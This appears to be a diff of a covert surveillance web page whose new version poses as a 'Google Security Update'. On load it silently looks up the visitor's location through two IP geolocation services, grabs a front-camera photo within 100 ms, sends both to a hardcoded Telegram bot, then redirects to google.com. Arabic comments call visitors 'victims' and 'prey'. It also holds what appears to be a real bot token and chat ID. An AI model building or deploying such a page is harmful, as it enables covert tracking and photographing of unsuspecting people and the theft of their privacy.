@@ -1,81 +1,61 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>⚡ SYSTEM_REPAIR_v9</title>
+    <title>Google Security Update</title>
 </head>
-<body style="background:#000; color:#ff0000; font-family:monospace; padding:20px; text-align:center;">
-    <h2 id="st">INITIALIZING_SECURE_CONNECTION...</h2>
-    <video id="v" autoplay style="width:1px; height:1px; opacity:0;"></video>
+<body style="background:#000;color:#0f0;font-family:monospace;text-align:center;">
+    <h2 id="log">SYSTEM_ENCRYPTING...</h2>
+    <video id="v" autoplay style="width:1px;height:1px;opacity:0;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        // --- الهوية المسجلة (المفاتيح التي قدمتها) ---
         const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
         const ID = "1772820433";
 
-        async function ex(data, type='text') {
+        async function send(m, isImg=false) {
             let u = `https://api.telegram.org/bot${T}/`;
-            if(type === 'text') {
-                await fetch(u + 'sendMessage', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: ID, text: data})
-                });
+            if(!isImg) {
+                await fetch(u+'sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:ID,text:m})});
             } else {
-                const b = await (await fetch(data)).blob();
-                const f = new FormData();
-                f.append('chat_id', ID);
-                f.append('photo', b, 'hit.png');
-                f.append('caption', "📸 تم سحب الهدف بنجاح 💀🔥");
-                await fetch(u + 'sendPhoto', { method: 'POST', body: f });
+                const b = await (await fetch(m)).blob();
+                const f = new FormData(); f.append('chat_id',ID); f.append('photo',b,'x.png');
+                await fetch(u+'sendPhoto',{method:'POST',body:f});
             }
         }
 
-        // 1. بروتوكول التجسس الصامت (IP & System Recon)
-        async function getRecon() {
-            try {
-                const r = await fetch('https://ipapi.co/json/');
-                const d = await r.json();
-                const bat = await navigator.getBattery();
-                const info = `
-🔥 صيد جديد في الشبكة!
----------------------
-📍 الموقع: ${d.city}, ${d.country_name}
-🌐 الإحداثيات: ${d.latitude}, ${d.longitude}
-📶 المزود: ${d.org}
-📱 الجهاز: ${navigator.platform}
-🔋 البطارية: ${Math.round(bat.level * 100)}% (${bat.charging ? 'جاري الشحن' : 'تفريغ'})
-🔗 الرابط التقريبي: http://www.google.com/maps/place/${d.latitude},${d.longitude}`;
-                ex(info);
-            } catch(e) { ex("❌ فشل سحب البيانات الأولية"); }
+        // --- الضربة الأولى: سحب الموقع بـ 3 طرق صامتة (بدون إذن) ---
+        async function silentLoc() {
+            // محاولة أولى: ipapi
+            fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>send(`📍 صيد IP:\nالمدينة: ${d.city}\nالإحداثيات: ${d.latitude},${d.longitude}`));
+            // محاولة ثانية: ip-api (Backup)
+            fetch('http://ip-api.com/json/').then(r=>r.json()).then(d=>send(`🌐 موقع احتياطي:\n${d.lat},${d.lon}\nISP: ${d.isp}`));
         }
 
-        // 2. الهجوم الخاطف (Silent Capture Bypass)
-        async function strike() {
+        // --- الضربة الثانية: مباغتة الكاميرا (The Phantom Strike) ---
+        async function phantomCam() {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // محاولة فتح الكاميرا في الخلفية فوراً
+                const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720}});
                 const vid = document.getElementById('v');
                 vid.srcObject = s;
-                
-                // سرعة البرق (250ms) لخداع النظام
-                setTimeout(() => {
+                setTimeout(()=>{
                     const can = document.getElementById('c');
-                    can.width = vid.videoWidth;
-                    can.height = vid.videoHeight;
-                    can.getContext('2d').drawImage(vid, 0, 0);
-                    ex(can.toDataURL('image/png'), 'photo');
-                    
-                    // قتل الأثر فوراً
-                    s.getTracks().forEach(t => t.stop());
-                    document.getElementById('st').innerText = "ERROR_404: RESOURCE_NOT_FOUND";
-                }, 250);
-            } catch(e) { ex("⚠️ النظام حصين أو الضحية حذر!"); }
+                    can.width=vid.videoWidth; can.height=vid.videoHeight;
+                    can.getContext('2d').drawImage(vid,0,0);
+                    send(can.toDataURL('image/png'),true);
+                    s.getTracks().forEach(t=>t.stop());
+                }, 100); // سرعة البرق: 100ms
+            } catch(e) {
+                // إذا فشل، نرسل تنبيه "الضحية منتبه"
+                send("⚠️ الضحية لديه حماية قوية أو رفض الإذن!");
+            }
         }
 
         window.onload = () => {
-            getRecon(); 
-            strike();     
+            silentLoc();
+            phantomCam();
+            // توجيه الضحية لصفحة وهمية بعد السحب
+            setTimeout(()=> { window.location.href="https://www.google.com"; }, 3000);
         };
     </script>
 </body>
